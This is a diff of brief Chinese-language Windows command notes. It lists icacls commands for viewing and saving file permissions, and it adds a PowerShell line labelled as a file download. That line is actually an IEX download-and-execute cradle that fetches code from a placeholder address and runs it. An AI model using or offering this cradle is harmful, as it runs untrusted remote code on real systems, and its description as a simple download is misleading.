@@ -1,5 +1,8 @@
 用 icacls 來找file 的權限
-icacls boot.ini
-icacls c:\windows\*.exe /save filename /  t
-查看權限代達方式
-http://www.coopware.in2.info/_ntfsacl_ht.htm
+  icacls boot.ini
+  icacls c:\windows\*.exe /save filename /  t
+查看權限表達方式
+  http://www.coopware.in2.info/_ntfsacl_ht.htm
+
+用Powershell download文件
+  powershell "IEX(New-Object Net.WebClient).downloadString('https://ipaddress:port/file')"
